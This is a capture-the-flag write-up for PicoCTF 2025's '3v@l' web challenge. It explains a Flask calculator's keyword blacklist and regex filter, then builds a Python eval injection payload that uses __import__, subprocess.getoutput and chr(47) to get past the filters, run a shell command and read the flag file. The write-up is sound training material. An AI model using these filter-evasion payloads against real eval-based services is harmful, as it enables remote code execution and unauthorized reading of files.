# 3v@l
This was a challenge listed in PicoCTF 2025.  It's listed as medium and categorized as a Web Exploitation challenge.

## Description
The Description reads:
> ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank.  
> Unfortunately, they are using an eval function to calculate the loan.  
> Bypassing this will give you Remote Code Execution (RCE).  
> Can you exploit the bank's calculator and read the flag?

## Hints
There are three hints for this challenge:
> Bypass regex  
> The flag file is /flag.txt  
> You might need encoding or dynamic construction to bypass restrictions.

# Solving
## My Thoughts
This is now the third challenge that has to do with RCE via insecure python.  Not a huge fan of that but whatever, this version was a significantly easier version of SSTI2, especially because of how many hints and clues there were.  This really should not have been a medium difficulty challenge.

## Source Code
Whenever I open a web challenge, the first thing I do is open up the inspector and take a look at the source code, which turned up some great info this time around:

![Web Page Source](https://github.com/user-attachments/assets/e2a6f184-bcf8-4365-ab19-b87a5e2325fa)

Looks like they are using python_flask for the web framework and are blocking certain characters and certain keywords.  Let's go over everything.

Blocked Keywords:

- os
- eval
- exec
- bind
- connect
- python
- socket
- ls
- cat
- shell
- bind

Ok, and the regex below is checking for something:

``` bash
'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
```

This appears to be looking for some sort of hex?  Let's go through it:

- 0x:  Looks for the string to start with the characters '0x'
- [0-9A-Fa-f]+:  Looks for the characters within the brackets at least once
- |:  Essentially an or statement
- \\u:  Matches \u literally.
- [0-9A-Fa-f]{4}:  Matches the characters within the brackets exactly 4 times.
- %[0-9A-Fa-f]{2}:  Matches the literal percent character followed by exactly 2 of the characters within the brackets.
- \.[A-Za-z0-9]{1,3}:  Matches the literal period character followed by 1 to 3 of the characters within the brackets.
- \b:  Matches the end of a word I believe, this one's a little confusing.
- [\\\/]:  Match a single character, either / or \.
- \.\.:  Matches ..

So, some examples of strings that would fail to feed through the blacklist:

- 0xFA (Hex characters)
- \u09AF (unicode)
- %FE (html encoding)
- .exe (file extensions at the end of a word)
- /flag.txt (blocks path traversal)
- ./flag.txt (blocks local file reference/path traversal)

## Blacklist Evasion
So, our payload needs to be interpreted by flask, and it needs to avoid all of the above blacklisting.  Let's first figure out some alternatives, normally we would use something like python's OS module to easily import system so we could run system commands.  
Since os is blocked, we can instead us subprocess and it's getoutput function.  We also won't be able to read /flag.txt for a few reasons, so since python's built in chr function isn't blocked, we can use chr(47) to subvert the block on /.  
Instead of dealing with the .txt, we can just use a wildcard character to match any files that start with flag.
Lastly, the cat command is blocked so let's use head instead!  Once we figure out how to run it, our payload to read the flag will look something like this (in pure python):

``` python
from subprocess import getoutput
getoutput('head ' + chr(47) + 'flag*')
```

Nice!  Now we know that the site works by using python's eval function, so how can we fit the above into a single line that will work in eval? Time to get into some nitty gritty python:

When you run 'import' in a python command, you are actually calling the builting __import__() function.  So if we type 'import subprocess', we're actually calling __import__('subprocess'), let's try that out in python's eval:

``` python
>>> eval('__import__("subprocess")')
<module 'subprocess' from '/usr/lib/python3.13/subprocess.py'>
```

Nice! Now how would we import getoutput?  Like this!

``` python
>>> eval('__import__("subprocess").getoutput')
<function getoutput at 0x7f0d313e3560>
```

Now, it's very important to note that python's eval function emulates a single expression, not a statement.  This means that you can't do things like variable assignment or something.  So in one line we have to get this to work.  What's interesting about the above, is that you can do just that!

``` python
>>> eval('__import__("subprocess").getoutput("whoami")')
'user'
```

Neat so let's craft our final payload and verify it works:

```
__import__("subprocess").getoutput("head " + chr(47) + "flag*")
```

And sure enough we got our flag:

![Evaluated](https://github.com/user-attachments/assets/8e087805-6118-4250-b7c3-e5c55725faa1)

